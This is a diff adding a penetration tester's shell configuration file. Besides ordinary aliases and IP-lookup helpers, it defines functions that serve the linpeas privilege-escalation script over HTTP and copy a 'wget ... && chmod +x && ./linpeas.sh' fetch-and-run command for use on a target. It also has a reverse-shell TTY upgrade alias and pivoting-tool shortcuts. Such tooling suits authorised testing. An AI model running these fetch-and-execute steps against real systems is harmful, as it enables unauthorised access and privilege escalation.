@@ -1,0 +1,29 @@
+export PATH=$PATH:/home/ene/Tools/bin:/home/ene/go/bin
+
+if [ "$TMUX" = "" ]; then tmux; fi
+
+alias proxyq='proxychains -q'
+alias TTY='stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=tmux-256color; stty rows 38 columns 116; reset;'
+
+cpip() {
+        if [[ $(ip addr | grep $1) == '' ]]; then echo 'Bad Interface'; else ip addr show dev $1 | grep 'inet\b' | awk '{print $2}'| cut -d/ -f1 | xclip -sel clip ; fi
+}
+
+
+showip() {
+        if [[ $(ip addr | grep $1) == '' ]]; then echo 'Bad Interface'; else ip addr show dev $1 | grep 'inet\b' | awk '{print $2}'| cut -d/ -f1; fi
+}
+
+# Linpeas
+linpeascp() {
+        cp /usr/share/peass/linpeas/linpeas.sh .
+        python3 -m http.server $1
+}
+
+linpeasuse() {
+        echo "wget '$(showip $1)/linpeas.sh' && chmod +x linpeas.sh && ./linpeas.sh" | xclip -sel clip
+}
+
+alias ligolo='cd ~/Documents/Tools/ligolo-ng/'
+
+alias ls='colorls'
